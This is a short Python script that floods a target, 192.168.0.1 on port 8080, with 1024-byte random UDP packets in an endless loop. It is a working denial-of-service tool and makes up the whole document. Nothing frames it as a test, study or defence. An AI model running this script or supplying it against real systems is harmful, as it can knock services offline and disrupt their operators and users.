import socket
import random

target_ip = '192.168.0.1'    # Target IP address
target_port = 8080           # Target port number
packet_size = 1024           # Packet size in bytes

# Create a socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Generate and send packets in a loop
while True:
    # Generate a random packet data
    packet_data = bytes(random.getrandbits(8) for _ in range(packet_size))
    
    # Send the packet to the target IP and port
    sock.sendto(packet_data, (target_ip, target_port))
